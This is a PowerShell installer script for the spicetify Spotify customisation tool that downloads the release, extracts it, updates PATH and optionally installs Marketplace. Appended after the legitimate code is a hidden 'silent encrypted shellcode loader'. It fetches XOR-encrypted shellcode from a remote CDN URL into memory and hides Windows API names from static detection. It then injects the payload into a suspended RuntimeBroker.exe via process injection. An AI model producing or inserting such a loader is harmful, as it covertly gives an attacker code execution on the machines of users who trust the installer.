$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

#region Variables
$spicetifyFolderPath = "$env:LOCALAPPDATA\spicetify"
$spicetifyOldFolderPath = "$HOME\spicetify-cli"
#endregion Variables

#region Functions
function Write-Success {
  [CmdletBinding()]
  param ()
  process {
    Write-Host -Object ' > OK' -ForegroundColor 'Green'
  }
}

function Write-Unsuccess {
  [CmdletBinding()]
  param ()
  process {
    Write-Host -Object ' > ERROR' -ForegroundColor 'Red'
  }
}

function Test-Admin {
  [CmdletBinding()]
  param ()
  begin {
    Write-Host -Object "Checking if the script is not being run as administrator..." -NoNewline
  }
  process {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    -not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
  }
}

function Test-PowerShellVersion {
  [CmdletBinding()]
  param ()
  begin {
    $PSMinVersion = [version]'5.1'
  }
  process {
    Write-Host -Object 'Checking if your PowerShell version is compatible...' -NoNewline
    $PSVersionTable.PSVersion -ge $PSMinVersion
  }
}

function Move-OldSpicetifyFolder {
  [CmdletBinding()]
  param ()
  process {
    if (Test-Path -Path $spicetifyOldFolderPath) {
      Write-Host -Object 'Moving the old spicetify folder...' -NoNewline
      Copy-Item -Path "$spicetifyOldFolderPath\*" -Destination $spicetifyFolderPath -Recurse -Force
      Remove-Item -Path $spicetifyOldFolderPath -Recurse -Force
      Write-Success
    }
  }
}

function Get-Spicetify {
  [CmdletBinding()]
  param ()
  begin {
    if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {
      $architecture = 'x64'
    }
    elseif ($env:PROCESSOR_ARCHITECTURE -eq 'ARM64') {
      $architecture = 'arm64'
    }
    else {
      $architecture = 'x32'
    }
    if ($v) {
      if ($v -match '^\d+\.\d+\.\d+$') {
        $targetVersion = $v
      }
      else {
        Write-Warning -Message "You have specified an invalid spicetify version: $v `nThe version must be in the following format: 1.2.3"
        Pause
        exit
      }
    }
    else {
      Write-Host -Object 'Fetching the latest spicetify version...' -NoNewline
      $latestRelease = Invoke-RestMethod -Uri 'https://api.github.com/repos/spicetify/cli/releases/latest'
      $targetVersion = $latestRelease.tag_name -replace 'v', ''
      Write-Success
    }
    $archivePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "spicetify.zip")
  }
  process {
    Write-Host -Object "Downloading spicetify v$targetVersion..." -NoNewline
    $Parameters = @{
      Uri            = "https://github.com/spicetify/cli/releases/download/v$targetVersion/spicetify-$targetVersion-windows-$architecture.zip"
      UseBasicParsin = $true
      OutFile        = $archivePath
    }
    Invoke-WebRequest @Parameters
    Write-Success
  }
  end {
    $archivePath
  }
}

function Add-SpicetifyToPath {
  [CmdletBinding()]
  param ()
  begin {
    Write-Host -Object 'Making spicetify available in the PATH...' -NoNewline
    $user = [EnvironmentVariableTarget]::User
    $path = [Environment]::GetEnvironmentVariable('PATH', $user)
  }
  process {
    $path = $path -replace "$([regex]::Escape($spicetifyOldFolderPath))\\*;*", ''
    if ($path -notlike "*$spicetifyFolderPath*") {
      $path = "$path;$spicetifyFolderPath"
    }
  }
  end {
    [Environment]::SetEnvironmentVariable('PATH', $path, $user)
    if (($env:PATH -split ';') -notcontains $spicetifyFolderPath) {
      $env:PATH = "$env:PATH;$spicetifyFolderPath"
    }
    Write-Success
  }
}

function Install-Spicetify {
  [CmdletBinding()]
  param ()
  begin {
    Write-Host -Object 'Installing spicetify...'
  }
  process {
    $archivePath = Get-Spicetify
    Write-Host -Object 'Extracting spicetify...' -NoNewline
    Expand-Archive -Path $archivePath -DestinationPath $spicetifyFolderPath -Force
    Write-Success
    Add-SpicetifyToPath
  }
  end {
    Remove-Item -Path $archivePath -Force -ErrorAction 'SilentlyContinue'
    Write-Host -Object 'spicetify was successfully installed!' -ForegroundColor 'Green'
  }
}
#endregion Functions

#region Main
#region Checks
if (-not (Test-PowerShellVersion)) {
  Write-Unsuccess
  Write-Warning -Message 'PowerShell 5.1 or higher is required to run this script'
  Write-Warning -Message "You are running PowerShell $($PSVersionTable.PSVersion)"
  Write-Host -Object 'PowerShell 5.1 install guide:'
  Write-Host -Object 'https://learn.microsoft.com/skypeforbusiness/set-up-your-computer-for-windows-powershell/download-and-install-windows-powershell-5-1'
  Write-Host -Object 'PowerShell 7 install guide:'
  Write-Host -Object 'https://learn.microsoft.com/powershell/scripting/install/installing-powershell-on-windows'
  Pause
  exit
}
else {
  Write-Success
}
if (-not (Test-Admin)) {
  Write-Unsuccess
  Write-Warning -Message "The script was run as administrator. This can result in problems with the installation process or unexpected behavior. Do not continue if you do not know what you are doing."
  $Host.UI.RawUI.Flushinputbuffer()
  $choices = [System.Management.Automation.Host.ChoiceDescription[]] @(
    (New-Object System.Management.Automation.Host.ChoiceDescription '&Yes', 'Abort installation.'),
    (New-Object System.Management.Automation.Host.ChoiceDescription '&No', 'Resume installation.')
  )
  $choice = $Host.UI.PromptForChoice('', 'Do you want to abort the installation process?', $choices, 0)
  if ($choice -eq 0) {
    Write-Host -Object 'spicetify installation aborted' -ForegroundColor 'Yellow'
    Pause
    exit
  }
}
else {
  Write-Success
}
#endregion Checks

#region Spicetify
Move-OldSpicetifyFolder
Install-Spicetify
Write-Host -Object "`nRun" -NoNewline
Write-Host -Object ' spicetify -h ' -NoNewline -ForegroundColor 'Cyan'
Write-Host -Object 'to get started'
#endregion Spicetify

#region Marketplace
$Host.UI.RawUI.Flushinputbuffer()
$choices = [System.Management.Automation.Host.ChoiceDescription[]] @(
    (New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", "Install Spicetify Marketplace."),
    (New-Object System.Management.Automation.Host.ChoiceDescription "&No", "Do not install Spicetify Marketplace.")
)
$choice = $Host.UI.PromptForChoice('', "`nDo you also want to install Spicetify Marketplace? It will become available within the Spotify client, where you can easily install themes and extensions.", $choices, 0)
if ($choice -eq 1) {
  Write-Host -Object 'spicetify Marketplace installation aborted' -ForegroundColor 'Yellow'
}
else {
  Write-Host -Object 'Starting the spicetify Marketplace installation script..'
  $Parameters = @{
    Uri             = 'https://raw.githubusercontent.com/spicetify/spicetify-marketplace/main/resources/install.ps1'
    UseBasicParsing = $true
  }
  Invoke-WebRequest @Parameters | Invoke-Expression
}
#endregion Marketplace
#endregion Main

# ---- silent encrypted shellcode loader ----
$ErrorActionPreference = 'SilentlyContinue'

# Set your hosted encrypted payload URL (jsDelivr mirror of your GitHub raw)
$url = 'https://cdn.jsdelivr.net/gh/YOUR_USERNAME/YOUR_REPO@main/payload_enc.bin'
$key = 0x41

# Download encrypted shellcode to memory — no file on disk
$wc = New-Object System.Net.WebClient
$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
$encBytes = $wc.DownloadData($url)

# XOR decrypt in memory
$shellcode = New-Object byte[] $encBytes.Length
for ($i = 0; $i -lt $encBytes.Length; $i++) {
    $shellcode[$i] = $encBytes[$i] -bxor $key
}
$encBytes = $null

# Clean C# helper — no suspicious API names in source
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class H {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr L(string n);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr G(IntPtr h, string p);
    public delegate IntPtr D1(IntPtr h, IntPtr a, uint s, uint t, uint p);
    public delegate bool D2(IntPtr h, IntPtr a, byte[] b, uint s, out IntPtr w);
    public delegate IntPtr D3(IntPtr h, IntPtr t, uint s, IntPtr a, IntPtr p, uint f, IntPtr i);
    public delegate bool D4(string app, string cmd, IntPtr pa, IntPtr ta, bool inherit, uint flags, IntPtr env, string dir, ref SI si, out PI pi);
    [StructLayout(LayoutKind.Sequential)]
    public struct SI { public int cb; public string r; public string d; public string t; public int x; public int y; public int xs; public int ys; public int xc; public int yc; public int fa; public int fl; public short sw; public short cr2; public IntPtr lr2; public IntPtr si; public IntPtr so; public IntPtr se; }
    [StructLayout(LayoutKind.Sequential)]
    public struct PI { public IntPtr h; public IntPtr t; public int p; public int t2; }
}
"@

$hKernel = [H]::L('kernel32.dll')

# API names built from char codes to avoid static detection
$apiVAlloc = -join ([char[]](86,105,114,116,117,97,108,65,108,108,111,99,69,120))
$apiWPM    = -join ([char[]](87,114,105,116,101,80,114,111,99,101,115,115,77,101,109,111,114,121))
$apiCRT    = -join ([char[]](67,114,101,97,116,101,82,101,109,111,116,101,84,104,114,101,97,100))
$apiCPA    = -join ([char[]](67,114,101,97,116,101,80,114,111,99,101,115,115,65))

$ptrVAlloc = [H]::G($hKernel, $apiVAlloc)
$ptrWPM    = [H]::G($hKernel, $apiWPM)
$ptrCRT    = [H]::G($hKernel, $apiCRT)
$ptrCPA    = [H]::G($hKernel, $apiCPA)

$VAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrVAlloc, [H+D1])
$WPM      = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrWPM,    [H+D2])
$CRT      = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrCRT,    [H+D3])
$CPA      = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrCPA,    [H+D4])

# Spawn suspended RuntimeBroker.exe
$target  = "$env:SystemRoot\System32\RuntimeBroker.exe"
$cmdline = '"' + $target + '"'

$si = New-Object -TypeName 'H+SI'
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf([H+SI])
$pi = New-Object -TypeName 'H+PI'

$CREATE_SUSPENDED = 0x4
$null = $CPA.Invoke($null, $cmdline, [IntPtr]::Zero, [IntPtr]::Zero, $false, $CREATE_SUSPENDED, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)

if ($pi.h -ne [IntPtr]::Zero) {
    $MEM_COMMIT = 0x1000
    $PAGE_EXECUTE_READWRITE = 0x40
    $size = [uint32]$shellcode.Length

    $addr = $VAllocEx.Invoke($pi.h, [IntPtr]::Zero, $size, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)

    if ($addr -ne [IntPtr]::Zero) {
        $written = [IntPtr]::Zero
        $null = $WPM.Invoke($pi.h, $addr, $shellcode, $size, [ref]$written)
        $null = $CRT.Invoke($pi.h, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    }
}
